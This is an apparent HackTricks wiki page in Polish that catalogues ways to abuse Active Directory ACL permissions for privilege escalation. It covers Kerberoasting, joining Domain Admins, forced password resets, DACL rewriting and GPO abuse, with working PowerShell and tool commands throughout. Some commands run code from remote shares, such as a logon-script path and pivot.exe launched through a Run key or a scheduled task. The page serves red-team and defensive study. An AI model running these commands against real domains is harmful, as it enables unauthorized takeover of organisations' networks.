# Nadużywanie ACL/ACE Active Directory

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

**Ta strona jest głównie podsumowaniem technik z** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Aby uzyskać więcej szczegółów, sprawdź oryginalne artykuły.**

## **Prawa GenericAll na użytkownika**

Ten przywilej daje atakującemu pełną kontrolę nad docelowym kontem użytkownika. Gdy prawa `GenericAll` zostaną potwierdzone za pomocą polecenia `Get-ObjectAcl`, atakujący może:

* **Zmienić hasło docelowego**: Używając `net user <nazwa_użytkownika> <hasło> /domain`, atakujący może zresetować hasło użytkownika.
* **Celowane Kerberoasting**: Przypisz SPN do konta użytkownika, aby uczynić je podatnym na kerberoasting, a następnie użyj Rubeus i targetedKerberoast.py, aby wyodrębnić i spróbować złamać hashe biletu przyznającego (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Targeted ASREPRoasting**: Wyłącz pre-autoryzację dla użytkownika, co sprawia, że jego konto jest podatne na ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Rights on Group**

To uprawnienie pozwala atakującemu na manipulowanie członkostwem grup, jeśli mają prawa `GenericAll` do grupy takiej jak `Domain Admins`. Po zidentyfikowaniu wyróżnionej nazwy grupy za pomocą `Get-NetGroup`, atakujący może:

* **Dodać Siebie do Grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub korzystając z modułów takich jak Active Directory lub PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień na obiekcie komputera lub koncie użytkownika pozwala na:

* **Kerberos Resource-based Constrained Delegation**: Umożliwia przejęcie obiektu komputera.
* **Shadow Credentials**: Użyj tej techniki, aby podszyć się pod konto komputera lub użytkownika, wykorzystując uprawnienia do tworzenia shadow credentials.

## **WriteProperty on Group**

Jeśli użytkownik ma prawa `WriteProperty` do wszystkich obiektów w konkretnej grupie (np. `Domain Admins`), może:

* **Dodać Siebie do Grupy Domain Admins**: Możliwe poprzez połączenie poleceń `net user` i `Add-NetGroupUser`, ta metoda pozwala na eskalację uprawnień w obrębie domeny.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ten przywilej umożliwia atakującym dodanie siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń, które bezpośrednio manipulują członkostwem w grupie. Użycie następującej sekwencji poleceń pozwala na samododanie:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Podobne uprawnienie, pozwala atakującym na bezpośrednie dodawanie siebie do grup poprzez modyfikację właściwości grup, jeśli mają prawo `WriteProperty` do tych grup. Potwierdzenie i wykonanie tego uprawnienia odbywa się za pomocą:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posiadanie `ExtendedRight` na użytkowniku dla `User-Force-Change-Password` umożliwia resetowanie haseł bez znajomości aktualnego hasła. Weryfikacja tego prawa i jego wykorzystanie mogą być przeprowadzone za pomocą PowerShell lub alternatywnych narzędzi wiersza poleceń, oferując kilka metod resetowania hasła użytkownika, w tym sesje interaktywne i jednowierszowe polecenia dla środowisk nieinteraktywnych. Polecenia obejmują od prostych wywołań PowerShell po użycie `rpcclient` na Linuksie, co pokazuje wszechstronność wektorów ataku.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner na grupie**

Jeśli atakujący odkryje, że ma prawa `WriteOwner` do grupy, może zmienić właściciela grupy na siebie. Ma to szczególne znaczenie, gdy grupą, o której mowa, są `Domain Admins`, ponieważ zmiana właściciela pozwala na szerszą kontrolę nad atrybutami grupy i członkostwem. Proces ten polega na zidentyfikowaniu odpowiedniego obiektu za pomocą `Get-ObjectAcl`, a następnie użyciu `Set-DomainObjectOwner`, aby zmodyfikować właściciela, zarówno przez SID, jak i nazwę.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite na użytkowniku**

To uprawnienie pozwala atakującemu na modyfikację właściwości użytkownika. Konkretnie, z dostępem `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby wykonać złośliwy skrypt po logowaniu użytkownika. Osiąga się to za pomocą polecenia `Set-ADObject`, aby zaktualizować właściwość `scriptpath` docelowego użytkownika, aby wskazywała na skrypt atakującego.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite na grupie**

Dzięki temu uprawnieniu, atakujący mogą manipulować członkostwem w grupie, na przykład dodając siebie lub innych użytkowników do konkretnych grup. Proces ten obejmuje tworzenie obiektu poświadczeń, używanie go do dodawania lub usuwania użytkowników z grupy oraz weryfikację zmian członkostwa za pomocą poleceń PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Posiadanie obiektu AD i posiadanie uprawnień `WriteDACL` na nim umożliwia atakującemu nadanie sobie uprawnień `GenericAll` do obiektu. Osiąga się to poprzez manipulację ADSI, co pozwala na pełną kontrolę nad obiektem i możliwość modyfikacji jego członkostwa w grupach. Mimo to, istnieją ograniczenia przy próbie wykorzystania tych uprawnień za pomocą poleceń `Set-Acl` / `Get-Acl` modułu Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacja w domenie (DCSync)**

Atak DCSync wykorzystuje specyficzne uprawnienia replikacji w domenie, aby naśladować kontroler domeny i synchronizować dane, w tym poświadczenia użytkowników. Ta potężna technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, co pozwala atakującym na wydobycie wrażliwych informacji z środowiska AD bez bezpośredniego dostępu do kontrolera domeny. [**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)

## Delegacja GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegacja GPO

Delegowane uprawnienia do zarządzania obiektami zasad grupy (GPO) mogą stwarzać znaczne ryzyko bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` ma delegowane prawa do zarządzania GPO, może mieć uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Te uprawnienia mogą być nadużywane w celach złośliwych, co można zidentyfikować za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Wyliczanie uprawnień GPO

Aby zidentyfikować źle skonfigurowane GPO, można połączyć polecenia PowerSploit. Umożliwia to odkrycie GPO, do których dany użytkownik ma uprawnienia do zarządzania: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Komputery z zastosowaną daną polityką**: Możliwe jest ustalenie, które komputery mają zastosowaną konkretną GPO, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Polityki zastosowane do danego komputera**: Aby zobaczyć, jakie polityki są zastosowane do konkretnego komputera, można wykorzystać polecenia takie jak `Get-DomainGPO`.

**OUs z zastosowaną daną polityką**: Identyfikacja jednostek organizacyjnych (OUs) dotkniętych daną polityką może być przeprowadzona za pomocą `Get-DomainOU`.

### Nadużycie GPO - New-GPOImmediateTask

Źle skonfigurowane GPO mogą być wykorzystywane do wykonywania kodu, na przykład poprzez utworzenie natychmiastowego zadania zaplanowanego. Można to zrobić, aby dodać użytkownika do lokalnej grupy administratorów na dotkniętych maszynach, znacznie podnosząc uprawnienia:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Moduł GroupPolicy, jeśli jest zainstalowany, umożliwia tworzenie i łączenie nowych GPO oraz ustawianie preferencji, takich jak wartości rejestru do uruchamiania backdoorów na dotkniętych komputerach. Metoda ta wymaga zaktualizowania GPO oraz zalogowania się użytkownika na komputerze w celu wykonania:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferuje metodę nadużywania istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez potrzeby tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do tworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Wymuszenie aktualizacji polityki

Aktualizacje GPO zazwyczaj odbywają się co około 90 minut. Aby przyspieszyć ten proces, szczególnie po wprowadzeniu zmiany, można użyć polecenia `gpupdate /force` na docelowym komputerze, aby wymusić natychmiastową aktualizację polityki. To polecenie zapewnia, że wszelkie modyfikacje GPO są stosowane bez czekania na następny automatyczny cykl aktualizacji.

### Pod maską

Po zbadaniu zaplanowanych zadań dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań takich jak `evilTask`. Te zadania są tworzone za pomocą skryptów lub narzędzi wiersza poleceń mających na celu modyfikację zachowania systemu lub eskalację uprawnień.

Struktura zadania, jak pokazano w pliku konfiguracyjnym XML generowanym przez `New-GPOImmediateTask`, określa szczegóły zaplanowanego zadania - w tym polecenie do wykonania i jego wyzwalacze. Ten plik przedstawia, jak zaplanowane zadania są definiowane i zarządzane w ramach GPO, zapewniając metodę wykonywania dowolnych poleceń lub skryptów jako część egzekwowania polityki.

### Użytkownicy i grupy

GPO umożliwiają również manipulację członkostwem użytkowników i grup na docelowych systemach. Poprzez bezpośrednią edycję plików polityki Użytkownicy i Grupy, atakujący mogą dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegacji uprawnień zarządzania GPO, co pozwala na modyfikację plików polityki w celu dodania nowych użytkowników lub zmiany członkostwa w grupach.

Plik konfiguracyjny XML dla Użytkowników i Grup określa, jak te zmiany są wdrażane. Dodając wpisy do tego pliku, określonym użytkownikom można przyznać podwyższone uprawnienia w systemach objętych zmianami. Ta metoda oferuje bezpośrednie podejście do eskalacji uprawnień poprzez manipulację GPO.

Ponadto, można również rozważyć dodatkowe metody wykonywania kodu lub utrzymywania trwałości, takie jak wykorzystanie skryptów logowania/wylogowywania, modyfikacja kluczy rejestru dla autorunów, instalowanie oprogramowania za pomocą plików .msi lub edytowanie konfiguracji usług. Te techniki oferują różne możliwości utrzymania dostępu i kontrolowania docelowych systemów poprzez nadużycie GPO.

## Odniesienia

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
